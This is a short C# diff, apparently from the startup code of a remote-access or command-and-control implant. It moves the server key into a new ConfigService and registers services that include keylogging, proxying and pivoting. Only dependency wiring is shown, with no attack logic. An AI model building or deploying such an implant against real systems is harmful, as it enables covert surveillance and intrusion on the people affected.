@@ -73,7 +73,10 @@ namespace Agent
             var metaData = GenerateMetadata(connexion.ToString());
 
 
+            var configService = new ConfigService();
+            configService.ServerKey = serverKey;
 
+            ServiceProvider.RegisterSingleton<IConfigService>(configService);
             ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
             ServiceProvider.RegisterSingleton<IFileService>(new FileService());
             ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
@@ -81,10 +84,11 @@ namespace Agent
             ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
             ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
             ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
+
             
 
 
-            var commModule = CommunicationFactory.CreateCommunicator(connexion, serverKey);
+            var commModule = CommunicationFactory.CreateCommunicator(connexion);
             var agent = new Models.Agent(metaData, commModule);
 
             s_agentThread = new Thread(agent.Start);
